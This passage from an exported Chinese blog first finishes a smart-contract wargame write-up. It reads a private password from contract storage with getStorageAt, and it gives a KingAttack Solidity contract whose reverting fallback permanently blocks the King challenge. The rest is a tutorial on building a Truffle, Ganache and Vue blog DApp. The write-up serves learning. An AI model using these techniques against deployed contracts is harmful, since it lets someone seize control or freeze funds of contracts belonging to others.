<p>我们参考<code>web3.js</code><a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#getstorageat" target="_blank" rel="noopener">【文档】</a>,使用<strong>getStorageAt</strong>函数读取指定内存：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ol>
<li><code>String</code> - 用来获取存储值的地址。</li>
<li><code>Number|String|BN|BigNumber</code> - 存储的索引位置。</li>
<li><code>Number|String|BN|BigNumber</code> - (可选) 如果传入值则会覆盖通过 <a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#eth-defaultblock" target="_blank" rel="noopener">web3.eth.defaultBlock</a> 设置的默认区块号。预定义的区块号可以使用 <code>&quot;latest&quot;</code>, <code>&quot;earliest&quot;</code> <code>&quot;pending&quot;</code>, 和 <code>&quot;genesis&quot;</code> 等值。</li>
<li><code>Function</code> - (可选) 可选的回调函数，其第一个参数为错误对象，第二个参数为函数运行结果。</li>
</ol>
<p>我们可以在控制台输入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">"0x743e4DdB7A7415D8B4B91b6943AdD4749fa6bd27"</span>, <span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>

<p>其中前面第一个参数是合约的地址，调用<code>contract</code>可以获取。后面的参数是偏移量。</p>
<p>返回了<code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29</code>，实际上就是<code>password</code>变量。</p>
<p>我们将其作为参数，调用<code>unlock</code>函数即可。</p>
<p>实际上，我们将该密码解码，是一个字符串<code>A very strong secret password :)</code></p>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本关卡类似一个庞氏骗局，即任何人只要往该合约充值的钱数A大于上一任国王的钱数B，那他将会变成新的国王，同时旧国王将会得到数量为A的钱。</p>
</blockquote>
<p><strong>通关条件</strong>：提交实例后，系统将会尝试将王权拿走，你要阻止这一过程，即合约王权不会被更改（<strong>别想着往里边充值大量以太币，这个办法行不通</strong>）。</p>
<p>本关卡利用点是<code>transfer</code>。即我们获取王权后，尝试<strong>拒绝系统的转账</strong>。</p>
<p>智能合约中，有三种方式进行转账，分别是：</p>
<p><strong><code>send</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address payable&gt;.send(uint256 amount) returns (bool)</span><br></pre></td></tr></table></figure>

<p>向<code>address</code>转入<code>amount</code>，如果异常会转账失败，仅会返回false，不会终止执行（合约地址转账）,有gas限制，最大2300</p>
<p><strong><code>transfer</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address payable&gt;.transfer(uint256 amount)</span><br></pre></td></tr></table></figure>

<p>如果异常会转账失败，抛出异常(等价于requi(send()))（合约地址转账），有gas限制，最大2300。</p>
<p><strong><code>call</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</span><br></pre></td></tr></table></figure>

<p>如果异常会转账失败，仅会返回false，不会终止执行（调用合约的方法并转账）,没有gas限制.</p>
<p>从上面可以看出，当<code>transfer</code>出现异常时候，第19、20行就不被执行，即我们应该尝试触发一个异常，借助下面的合约，我们即可完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line"></span><br><span class="line">  	constructor(address payable  contract_addr) payable &#123;</span><br><span class="line">          contract_addr.call&#123;value:0.001 ether&#125;(&quot;&quot;);</span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; 触发异常，阻止King合约的19、20行的执行</span><br><span class="line">    	revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要先将我们的<code>KingAttack</code>合约部署，部署的时候同时转入<code>0.001 ether</code>(因为King合约中的<code>prize</code>为<code>0.001ether</code>)。部署完毕后，输入<code>await contract._king()</code>，如果返回的是我们<code>KingAttack</code>的地址，则说明我们获得了王权，此时直接提交实例即可。</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>链博--DAPP练手项目（三）</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<p>原文再续，书接上回。</p>
<p>这一回我们主要完成Vue项目和智能合约交互。完整代码请参考<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">【链接】</a><a id="more"></a></p>
<h2 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h2><p>在首页主要是请求全部的文章：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Web3 <span class="keyword">from</span> <span class="string">"web3"</span>;</span><br><span class="line"><span class="keyword">import</span> ChainBlogJson <span class="keyword">from</span> <span class="string">"@/build/ChainBlog.json"</span>;</span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line">methods: &#123;</span><br><span class="line">    <span class="comment">// 读取 json 文件，利用 abi 和地址初始化合约</span></span><br><span class="line">    <span class="keyword">async</span> f() &#123;</span><br><span class="line">      <span class="comment">//   var web3 = new Web3(Web3.givenProvider || "ws://localhost:8545");</span></span><br><span class="line">      <span class="keyword">var</span> web3 = <span class="keyword">new</span> Web3(<span class="string">"ws://localhost:7545"</span>);</span><br><span class="line">      <span class="keyword">const</span> networkId = <span class="keyword">await</span> web3.eth.net.getId();</span><br><span class="line">      <span class="keyword">const</span> abi = ChainBlogJson.abi;</span><br><span class="line">      <span class="keyword">const</span> contractAddress = ChainBlogJson.networks[networkId].address;</span><br><span class="line">      <span class="keyword">const</span> contract = <span class="keyword">new</span> web3.eth.Contract(abi, contractAddress);</span><br><span class="line">      <span class="keyword">this</span>.contract = contract;</span><br><span class="line">      <span class="keyword">this</span>.getAllBlog();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 调用合约中的函数</span></span><br><span class="line">    <span class="keyword">async</span> getAllBlog() &#123;</span><br><span class="line">      <span class="keyword">this</span>.contract.methods</span><br><span class="line">        .getAll()</span><br><span class="line">        .call()</span><br><span class="line">        .then(<span class="function">(<span class="params">blogs</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">this</span>.blogs = blogs;</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(e);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    <span class="keyword">this</span>.f();</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="新增文章页面"><a href="#新增文章页面" class="headerlink" title="新增文章页面"></a>新增文章页面</h2><p>在这个页面中，我们要获取<code>MetaMask</code>中活跃的账户，即正在使用的账户，然后连接智能合约，调用智能合约，流程还是差不多：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">submit() &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.content == <span class="string">""</span> || <span class="keyword">this</span>.title == <span class="string">""</span>)</span><br><span class="line">    alert(<span class="string">"Content and title can't be empty!"</span>);</span><br><span class="line">  <span class="comment">// 获取 metamask 中启动的账号</span></span><br><span class="line">  <span class="built_in">window</span>.ethereum</span><br><span class="line">    .enable()</span><br><span class="line">    .then(<span class="function">(<span class="params">accounts</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.contract.methods</span><br><span class="line">        .addBlog(<span class="keyword">this</span>.title, <span class="keyword">this</span>.summary, <span class="keyword">this</span>.content)</span><br><span class="line">        .send(&#123;</span><br><span class="line">          <span class="comment">// 利用授权的第一个，即正在活跃的账号进行提交文章</span></span><br><span class="line">          <span class="keyword">from</span>: accounts[<span class="number">0</span>],</span><br><span class="line">          gas: <span class="number">3000000</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">          alert(<span class="string">"发表成功"</span>);</span><br><span class="line">          <span class="keyword">this</span>.$router.push(&#123; <span class="attr">name</span>: <span class="string">"home"</span> &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(e);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><strong>注意！我们这里使用<code>send</code>函数而不是<code>call</code>函数，因为后者没法更新状态</strong></p>
<h2 id="文章详情页面"><a href="#文章详情页面" class="headerlink" title="文章详情页面"></a>文章详情页面</h2><p>这里有一点要注意，如果该文章的作者与正在登录的一致，我们给予删除和修改的权限</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 只有文章所有者才有权删除和修改 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"is_owner"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"delete_btn"</span> <span class="attr">v-on:click</span>=<span class="string">"deleteClick"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"modify_btn"</span> <span class="attr">v-on:click</span>=<span class="string">"modifyClick"</span>&gt;</span>修改<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ....... --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// .......</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 检查该文章是不是当前 metamask 中活跃的账户所写的</span></span></span><br><span class="line">    checkOwner() &#123;</span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.ethereum</span></span><br><span class="line">        .enable()</span><br><span class="line"><span class="javascript">        .then(<span class="function">(<span class="params">accounts</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (accounts[<span class="number">0</span>].toLowerCase() == <span class="keyword">this</span>.blog.author.toLowerCase()) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.is_owner = <span class="literal">true</span>;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(e);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="修改文章页面"><a href="#修改文章页面" class="headerlink" title="修改文章页面"></a>修改文章页面</h2><p>这里和新增文章页面差不多，只不过要先请求旧的文章填充表单，然后再提示用户修改。</p>
<hr>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>==此项目仅用于学习，请勿用于其他违反道德和法律的事项！==</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【1】ChainBlog（本项目完整源码）.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>【2】web3.js中文文档.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>【3】Solidity中文文档.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>【4】truffle文档.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>【5】开发、部署第一个DApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>【6】DApp教程：用Truffle 开发一个链上记事本.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>【7】Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>链博--DAPP练手项目（二）</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>原文再续，书接上回。</p>
<p>这一回我们主要做前置部署工作。<a id="more"></a></p>
<h2 id="Ganache配置"><a href="#Ganache配置" class="headerlink" title="Ganache配置"></a>Ganache配置</h2><p>首先打开<code>Ganache</code>，然后新建一个工程<code>chain_blog_network</code>，如下图所示，这表明我们在本地创建好了一个测试链（当然如果你有一些测试以太币，你可以部署到相应的测试链中）。在这个测试链中，有若干个账户，每个账户都有100个以太币，点击每个账户的钥匙图标就可以获取其私钥。</p>
<p><img src="https://cdn.yalexin.top/ganache_01.png" alt></p>
<h2 id="编写部署脚本"><a href="#编写部署脚本" class="headerlink" title="编写部署脚本"></a>编写部署脚本</h2><p>编写测试脚本之前，请再次确保配置文件<code>truffle-config.js</code>已经设置好:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: <span class="string">"127.0.0.1"</span>,     <span class="comment">// Localhost (default: none)</span></span><br><span class="line">     port: <span class="number">7545</span>,            <span class="comment">// Standard Ethereum port (default: none)</span></span><br><span class="line">     network_id: <span class="string">"*"</span>,       <span class="comment">// Any network (default: none)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着在<code>migrations</code>文件夹下新建一个部署脚本<code>1_deploy.js</code>，请注意，文件名以数字为前缀，后缀为描述。 编号前缀是必需的，以便记录迁移是否成功运行。 后缀纯粹是为了人类的可读性和理解力，在该文件中写入如下文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ChainBlog = artifacts.require(<span class="string">"ChainBlog"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(ChainBlog);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后在项目根目录下执行部署命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate</span></span><br></pre></td></tr></table></figure>

<p>当出现相关信息后，则说明部署成功了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Summary</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&gt; Total deployments:   1</span><br><span class="line">&gt; Final cost:          0.03190554 ETH</span><br></pre></td></tr></table></figure>

<h2 id="初始化Vue项目"><a href="#初始化Vue项目" class="headerlink" title="初始化Vue项目"></a>初始化Vue项目</h2><h3 id="Vue-安装"><a href="#Vue-安装" class="headerlink" title="Vue 安装"></a>Vue 安装</h3><p>使用命令行安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g @vue/cli</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vue -V</span></span><br><span class="line">@vue/cli 5.0.8</span><br></pre></td></tr></table></figure>

<h3 id="创建Vue项目"><a href="#创建Vue项目" class="headerlink" title="创建Vue项目"></a>创建Vue项目</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vue create chain_blog</span></span><br></pre></td></tr></table></figure>

<p>然后选择<code>vue2</code>版本，然后将一些“插件”装上即可，例如<code>Babel</code>、<code>Router</code>、<code>CSS Pre-processors</code>。</p>
<p>创建完毕后，记得在项目中安装<code>web3</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install web3 --save</span></span><br></pre></td></tr></table></figure>

<h3 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h3><p>为了方便<code>Vue</code>项目能够读取到合约的<code>abi</code>相关信息，我们要对之前生成的<code>truffle</code>项目做出简单修改。</p>
<p>将之前文件夹<code>chainBlogContracts</code>下所有的文件都复制到当前文件夹<code>chain_blog</code>下，并在<code>truffle-config.js</code>中设置构建路径，使得我们的<code>vue</code>应用能够获取智能合约相关的<code>ABI</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">  <span class="string">"contracts_build_directory"</span>: <span class="string">"./src/build"</span></span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后重新运行部署命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate</span></span><br></pre></td></tr></table></figure>

<p>如果不出意外，那我们将会在<code>vue</code>项目下的<code>src</code>文件夹下<code>build</code>目录中看到我们的智能合约<code>json</code>文件.</p>
<h2 id="MetaMask-安装"><a href="#MetaMask-安装" class="headerlink" title="MetaMask 安装"></a>MetaMask 安装</h2><p>我们的项目是基于智能合约，在智能合约中，每次和它们交互，需要一个账户。</p>
<p>交互过程中，我们完全可以直接手动创建交易，然后使用私钥进行签名，然后广播我们的交易，从而完成我们与智能合约交互。</p>
<p>然后如此一来，当我们有多个账户时候，切换账号以及账号的保管是一个麻烦的事情，因此我们可以借助<code>MetaMask</code>工具，将我们的账户交给其掌管，而且不用担心账户会被第三方机构窃取，因为最终我们的账户信息是保存在本地的。</p>
<p>可以到<code>chrome</code>浏览器或者<code>Edge</code>浏览器的扩展商店下载。</p>
<p>安装完以后，先添加一个网络，将我们的本地测试网络添加到<code>MetaMask</code></p>
<p><img src="https://cdn.yalexin.top/image-20230102101940590.png" alt="image-20230102101940590"></p>
<p>然后再回到<code>Ganache</code>中，复制几个账户的私钥，导入到<code>MetaMask</code>中，然后我们就可以看到我们的每个账户都有100个以太币了</p>
<hr>
<p>下一篇文章我们将使用<code>Vue</code>，借助智能合约的<code>json</code>文件与本地测试链中的智能合约交互。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【1】ChainBlog（本项目完整源码）.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>【2】web3.js中文文档.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>【3】Solidity中文文档.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>【4】truffle文档.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>【5】开发、部署第一个DApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>【6】DApp教程：用Truffle 开发一个链上记事本.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>【7】Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>链博--DAPP练手项目（一）</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们都知道目前主流的网站都是属于<code>web2.0</code>的应用，例如新浪微博，明明我们才是内容的输出者，可是最终收益的大头却是这些公司，而且我们的文章放在他们的服务器，他们想怎么着就怎么着；而区块链技术的出现，让去中心化思想渐入人心，我们的数据，将由我们自己掌控！</p>
<p>链上博客，让我们的文章写入区块链，人人都是自己数据的掌控者！</p>
<p>主要功能：</p>
<ol>
<li>查看所有人写的文章</li>
<li>编写和修改自己的文章</li>
</ol>
<p>这里我们使用智能合约来实现，借助<code>truffle</code>和<code>vue</code>，实现我们的<code>DAPP</code>的开发.</p>
<a id="more"></a>

<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p>本项目重点在于怎么使用<code>JavaScript</code>，具体而言是使用<code>web3.js</code>和智能合约交互，<strong>对于系统的性能优化尚未考虑</strong>。</p>
<p><img src="https://cdn.yalexin.top/image-20230102094246205.png" alt="image-20230102094246205.png"></p>
<hr>
<p><img src="https://cdn.yalexin.top/image-20230102094343131.png" alt="image-20230102094343131"></p>
<hr>
<p><img src="https://cdn.yalexin.top/image-20230102094601906.png" alt="image-20230102094601906"></p>
<h2 id="合约实现"><a href="#合约实现" class="headerlink" title="合约实现"></a>合约实现</h2><p>与现有流行的<code>B/C</code>模式相类似，我们需要一个类似的数据提供方，只不过<code>web2.0</code>时代下，该数据提供方是由一个中心服务器提供，在<code>web3.0</code>下，该数据由区块链提供，智能合约就有点类似数据提供方。</p>
<p>我们这里使用<code>Solidity</code>实现我们的合约.</p>
<h3 id="Node-js-安装"><a href="#Node-js-安装" class="headerlink" title="Node.js 安装"></a>Node.js 安装</h3><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">【链接】</a></p>
<h3 id="Ganache-安装"><a href="#Ganache-安装" class="headerlink" title="Ganache 安装"></a>Ganache 安装</h3><p>可以下载命令行版本的，也可以下载桌面版本的，我这里使用的是桌面版本的</p>
<p><a href="https://trufflesuite.com/ganache/" target="_blank" rel="noopener">【链接】</a></p>
<h3 id="truffle-安装"><a href="#truffle-安装" class="headerlink" title="truffle 安装"></a>truffle 安装</h3><p>使用包管理工具安装<code>truffle</code>，它是针对基于以太坊的<code>Solidity</code>语言的一套开发框架:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g truffle</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle --version</span></span><br><span class="line">Truffle v5.7.1 (core: 5.7.1)</span><br><span class="line">Ganache v7.6.0</span><br><span class="line">Solidity v0.5.16 (solc-js)</span><br><span class="line">Node v18.12.1</span><br><span class="line">Web3.js v1.8.1</span><br></pre></td></tr></table></figure>

<p>如果安装过程遇到网络问题，可以尝试换源或者使用<code>cnpm</code></p>
<p>然后使用<code>truffle</code>来初始化项目：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir chainBlogContracts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> chainBlogContracts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle init</span></span><br></pre></td></tr></table></figure>

<p>我们看一下项目结构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree</span></span><br><span class="line">D:.</span><br><span class="line">│  truffle-config.js</span><br><span class="line">│</span><br><span class="line">├─contracts</span><br><span class="line">├─migrations</span><br><span class="line">└─test</span><br></pre></td></tr></table></figure>

<p><code>contracts</code>存放我们的合约文件，<code>migrations</code>文件夹下存放部署脚本，<code>test</code>文件夹下存放测试脚本。</p>
<p><code>truffle-config.js</code>是配置文件，目前我们暂时修改的是<code>networks</code>对象:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: "127.0.0.1",     // Localhost (default: none)</span><br><span class="line">     port: 7545,            // Standard Ethereum port (default: none)</span><br><span class="line">     network_id: "*",       // Any network (default: none)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，端口和<code>Ganache</code>中设置的一致.</p>
<h3 id="编写合约"><a href="#编写合约" class="headerlink" title="编写合约"></a>编写合约</h3><p>详细实现请参考<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">【链接】</a></p>
<p>在contracts文件夹下，新建一个<code>ChainBlog.sol</code>文件，在这里完成我们的合约逻辑。</p>
<p>我们可以将所有的文章存放到一个数组中，此外，我们使用一个结构体来表示一篇文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct Blog &#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    address author;</span><br><span class="line">    string title;</span><br><span class="line">    string summary;</span><br><span class="line">    string content;</span><br><span class="line">    uint256 createTimestamp;</span><br><span class="line">    uint256 lastUpdateTimestamp;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 记录每个人编写的文章</span><br><span class="line">Blog[] public blogList;</span><br><span class="line"></span><br><span class="line">event AddBlogEvent(uint256 id, address author, string title, string summary, string content, uint256 createTimestamp);</span><br><span class="line">event ModifyBlogEvent(uint256 id, address author, string old_title, string old_summary, string old_content, string new_title, string new_summary, string new_content, uint256 modifyTimestamp);</span><br><span class="line">event DeleteBlogEvent(uint256 id, address author, string title, string summary, string content, uint256 deleteTimestamp);</span><br></pre></td></tr></table></figure>

<p>将<code>blogList</code>设置成<code>public</code>可以方便我们从外部直接访问该数组。我们还定义了几个事件，这几个事件后文会用到；触发事件，可以理解成我们往日志系统中写入一个日志，能合约的前端<code>UI</code>，例如，<code>Apps</code>、<code>web.js</code>，或者任何与<code>Ethereum JSON-RPC API</code>连接的东西，都可以侦听这些事件。</p>
<p><strong>编写文章</strong></p>
<p>我这里设置博客的<code>ID</code>对应其在数组中的下标，因此如果想要获取某一篇文章，可以直接根据<code>ID</code>转换成索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function addBlog( string memory _title, string memory _summary, string memory _content ) public &#123;</span><br><span class="line">       uint256 currentId &#x3D; blogList.length;</span><br><span class="line">       blogList.push(</span><br><span class="line">           Blog(currentId, msg.sender, _title, _summary, _content, block.timestamp, block.timestamp)</span><br><span class="line">       );</span><br><span class="line">       emit AddBlogEvent(currentId, msg.sender, _title, _summary, _content, block.timestamp);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>修改文章</strong></p>
<p>修改文章时候，只有文章的所有者才能有权修改，且要判断传进来的<code>id</code>是否有效：</p>
